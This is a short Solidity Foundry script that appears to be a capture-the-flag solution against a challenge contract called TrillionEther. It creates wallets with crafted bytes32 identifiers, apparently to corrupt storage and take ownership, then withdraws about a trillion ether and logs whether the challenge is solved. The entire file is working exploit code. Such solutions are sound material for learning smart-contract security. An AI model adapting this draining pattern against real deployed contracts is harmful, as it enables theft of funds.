//SPDX-License-Identifier:MIT
pragma solidity ^0.8.20;

import {Script,console} from "forge-std/Script.sol";
import {TrillionEther} from "../src/TrillionEther.sol";

contract Solve is Script{

    function run()public{
        vm.startBroadcast();
        TrillionEther trillionEther=TrillionEther(address(0x5FbDB2315678afecb367f032d93F642f64180aa3));
        trillionEther.createWallet{value:100 ether}(0x020c17171edbaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab);
        trillionEther.createWallet{value:100 ether}(0x57616c6c74310000000000000000000000000000000000000000000000000000);
        (,,address owner)=trillionEther.wallets(0x020c17171edbaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab);
        trillionEther.withdraw(0x020c17171edbaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab, 1_000_000_000_200 ether);
        console.log(trillionEther.isSolved());
        vm.stopBroadcast();
    }
}